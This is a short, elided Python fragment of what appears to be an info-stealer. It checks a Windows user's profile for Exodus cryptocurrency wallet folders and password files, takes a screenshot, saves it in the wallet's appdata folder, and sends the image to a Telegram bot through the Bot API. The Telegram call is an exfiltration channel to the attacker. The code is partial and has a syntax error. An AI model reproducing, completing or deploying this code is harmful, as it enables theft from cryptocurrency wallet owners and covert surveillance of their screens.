...
def initialize():
    ...
    screen = "C:\\Users\\" + username + "\\appdata\\roaming\\exodus\\screen.png"
    ...
    if os.path.exists(path) or os.path.exists(exodus_pswd_file) or os.path.exists(exodus_pswd_file_dwnload) or os.path.exists(exodus_pswd_file_document):
        ...
        myScreenshot.save(r path + '\screen.png')
    ...
    if exodus_exist:
        ...
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={chat_id}", files={'photo': img})
